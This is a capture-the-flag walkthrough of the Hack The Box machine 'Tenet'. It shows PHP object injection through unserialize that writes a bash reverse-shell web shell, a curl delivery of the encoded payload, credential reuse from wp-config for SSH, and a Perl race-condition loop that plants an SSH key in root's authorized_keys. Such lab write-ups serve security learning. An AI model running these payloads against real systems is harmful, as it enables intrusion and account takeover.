# Enumeration

Starting with basic `nmap` as usual.

`nmap -p 1-65535 -T4 -A -v 10.10.10.223`


```
Discovered open port 22/tcp on 10.10.10.223
Discovered open port 80/tcp on 10.10.10.223
```

Port 80 on http://10.10.10.223/ is just the default apache page, nothing interesting there.

Adding `tenet.htb` in `/etc/hosts`, and going to http://tenet.htb, now we see some blog.

At first glance there's nothing too interesting, however there is a post about some migration. Looking at the comment there (http://tenet.htb/index.php/2020/12/16/logs/#comment-2) it says:

"did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!"

Interesting reference to "sator php file" and "backup".

There doesn't look to be "sator.php" on tenet.htb.  However, I tried the original apache server and found `http://10.10.10.223/sator.php`.

This just prints:
```
[+] Grabbing users from text file
[] Database updated
```

What about the backup? I tried: `http://10.10.10.223/sator.php.bak` and bingo, we have the backup of that source code!

```php
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

# Foothold

A few things here. First of all there is user-defined input from `$_GET['arepo']` which means that we can freely provide it using `sator.php?arepo=INPUT`. Secondly the interesting thing there is that they are using `unserialize`.

Reading https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection  it seems to be that we can take advantage of unsafe object unserialization to modify the DatabaseExport class.

According to the page:
```
The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a “POP chain”.
All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.
```


The class does use `__destruct` and the class is declared when `unserialize` is called. So it's definitely vulnerable to object injection.

After some reading I realised that it would be possible to modify the class `$user_file` and `$data`. Due to this, we can write our own  data into our own file!

I plan to take advantage of this to start a reverse shell on the server.

First of all we need to serialize our own class with our own variables:


```php
<?php

class DatabaseExport
{
    public $user_file = 'rev.php';
    public $data = '';
}

print(serialize(new DatabaseExport()))

?>
```

our `$user_file` will be where we want to write our shell, I used `rev.php`. Our data will be the code of our reverse shell.

The final code is like this:

```php
<?php
class DatabaseExport {
    public $user_file = 'rev.php';
    public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.?.?/4444 0>&1\'"); ?>';
}

print urlencode(serialize(new DatabaseExport()));

?>
```

now we run our php file:
php tenet.php

that will print the url encoded serialized var:
```
$ php tenet.php ; echo;
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rev.php%22%3Bs%3A4%3A%22data%22%3Bs%3A72%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.?.?%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```



So we go to the url with that var as `arepo`:

```
curl http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rev.php%22%3Bs%3A4%3A%22data%22%3Bs%3A72%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.?.?%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

Now we start a nc for our reverse shell:

```
nc -lvnp 4444
```

Now we can go to `http://10.10.10.223/rev.php` and check our nc terminal!

```
/hax$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)

Connection from 10.10.10.223 42970 received!

```
```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# User

Right away we see `wordpress/wp-config.php`

```php
// ** MySQL settings - You can get this info from your web host ** //

/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );


/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

So we have `neil` and `Opera2112`.

And we can also use those creds to ssh:

```
$ ssh neil@tenet.htb
neil@tenet.htb's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 10 12:40:04 UTC 2021

  System load:  0.51               Processes:             175
  Usage of /:   15.1% of 22.51GB   Users logged in:       0
  Memory usage: 10%                IP address for ens160: 10.10.10.223
  Swap usage:   0%


53 packages can be updated.
31 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Thu Dec 17 10:59:51 2020 from 10.10.14.3
neil@tenet:~$
```

and there you have the user flag!

```
neil@tenet:~$ cat user.txt
```

# Privesc to root

Let's check if we can run `sudo`:

```
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

So we can run `/usr/local/bin/enableSSH.sh` as root.

Since we have access to run that script, let's see what it does:

```bash
neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

So basically it creates a random temp file at `/tmp/ssh-<random characters>`. It then writes the public key to that file, and finally cats that file into the root's ssh authorized keys.

I wanted to see if we can exploit that script to write our own key in `.ssh/authorized_keys` instead. My idea was to create a race condition, so that we can overwrite the tmp file after it's written but before it's copied to root. That way, when it's copied to root, it will be our key!


I could write a loop to create that race condition. I'm terrible at bash so I wrote it in perl since it's available on the machine but I'm sure the same idea works in other languages:

```perl
use warnings;
use strict;

while (1) {
        system("sudo  /usr/local/bin/enableSSH.sh &");
        my @tmp = glob("/tmp/ssh-*");
        if (!@tmp) {
                #print "file not found\n";
                next;
        }
        my $file = $tmp[0];
        print "found $file\n";
        open(my $fh, ">>", $file) or die $!;
        say $fh 'YOUR SSH KEY'; # REPLACE THIS WITH SSH PUBKEY
        close $fh;
}
```

So basically we have an infinite loop to run the script in the background, and at the same time find the `/tmp` file it creates and write our own ssh key in there.

Let's run it:

`perl script.pl`

Then while it is running, we can open a new ssh connection as root in another terminal:

```
$ ssh root@tenet.htb
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


53 packages can be updated.
31 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Feb 11 14:37:46 2021
root@tenet:~#
```

Congrats, you are root!

```
root@tenet:~# cat root.txt
```
